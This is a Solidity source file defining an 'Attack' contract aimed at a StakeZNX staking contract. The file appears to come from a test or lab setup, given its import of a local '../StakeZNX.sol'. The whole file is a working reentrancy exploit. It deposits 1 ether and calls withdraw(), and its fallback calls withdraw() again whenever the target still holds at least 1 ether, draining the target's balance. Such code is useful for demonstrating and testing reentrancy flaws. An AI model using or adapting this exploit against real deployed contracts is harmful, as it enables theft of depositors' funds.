// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../StakeZNX.sol";

contract Attack {
    StakeZNX public stakeZNX;

    constructor(address _stakeZNXAddress) payable {
        stakeZNX = StakeZNX(_stakeZNXAddress);
    }

    // Fallback is called when StakeZNX sends Ether to this contract.
    fallback() external payable {
        if (address(stakeZNX).balance >= 1 ether) {
            stakeZNX.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        stakeZNX.deposit{value: 1 ether}();
        stakeZNX.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}